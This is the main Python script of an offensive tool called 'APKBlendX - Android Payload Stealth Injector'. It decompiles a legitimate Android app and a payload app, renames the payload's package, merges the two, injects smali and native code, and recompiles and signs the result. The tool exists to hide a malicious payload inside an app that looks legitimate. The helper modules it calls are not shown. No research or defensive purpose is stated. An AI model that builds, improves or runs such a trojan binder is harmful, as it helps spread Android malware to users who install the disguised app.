import argparse
import os
import sys
import shutil

# Extend path to include local directories
sys.path.append('./modules')
sys.path.append('./utils')

# Import from modules
from modules import decompiler, rebrander, merger, smali_injector, native_injector, compiler, signer
# Import from utils directory
import file_utils
import smali_utils

def main():
    print(r"""
    █████╗ ██████╗ ██╗  ██╗██████╗ ██╗      ███████╗███╗   ██╗██████╗ ██╗  ██╗
   ██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██║      ██╔════╝████╗  ██║██╔══██╗╚██╗██╔╝
   ███████║██████╔╝█████╔╝ ██████╔╝██║█████╗█████╗  ██╔██╗ ██║██║  ██║ ╚███╔╝ 
   ██╔══██║██╔═══╝ ██╔═██╗ ██╔═══╝ ██║╚════╝██╔══╝  ██║╚██╗██║██║  ██║ ██╔██╗ 
   ██║  ██║██║     ██║  ██╗██║     ██║      ███████╗██║ ╚████║██████╔╝██╔╝ ██╗
   ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝      ╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                    APKBlendX - Android Payload Stealth Injector ~ By Zeus
    """)


    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True)
    parser.add_argument('--legit', required=True)
    parser.add_argument('--output', required=True)
    parser.add_argument('--auto-rebrand', choices=['yes', 'no'], default='no')
    parser.add_argument('--package-name')
    parser.add_argument('--keystore')
    parser.add_argument('--alias')
    parser.add_argument('--keystore-pass')
    parser.add_argument('--inject-smali')
    parser.add_argument('--inject-native')
    args = parser.parse_args()

    print("[*] Cleaning up workspace...")
    file_utils.clean_workspace()

    print(f"[+] Decompiling {args.legit}...")
    legit_src = decompiler.decompile_apk(args.legit, "workspace/legit_src")

    print(f"[+] Decompiling {args.target}...")
    payload_src = decompiler.decompile_apk(args.target, "workspace/payload_src")

    if args.auto_rebrand == 'yes':
        print("[+] Generating new package name...")
        new_pkg = file_utils.generate_random_package()
        print(f"[✓] New package name: {new_pkg}")
        rebrander.rebrand_package("workspace/payload_src", new_pkg)
    elif args.package_name:
        print(f"[+] Rebranding to package name: {args.package_name}")
        rebrander.rebrand_package("workspace/payload_src", args.package_name)

    print("[+] Merging APKs...")
    merged_src = merger.merge_sources("workspace/legit_src", "workspace/payload_src", "workspace/merged")

    if args.inject_smali:
        print("[+] Injecting smali code...")
        smali_injector.inject_smali(args.inject_smali, merged_src)

    if args.inject_native:
        print("[+] Injecting native libraries...")
        native_injector.inject_native_lib(args.inject_native, merged_src)

    print("[+] Recompiling APK...")
    recompiled_apk = compiler.compile_apk(merged_src, "build/temp.apk")

    print("[*] Signing APK...")
    signer.sign_apk(
        apk_path=recompiled_apk,
        output_apk=args.output,
        keystore_path=args.keystore,
        alias=args.alias,
        keystore_pass=args.keystore_pass
    )

    print(f"[✓] Final APK ready: {args.output}")

if __name__ == '__main__':
    main()
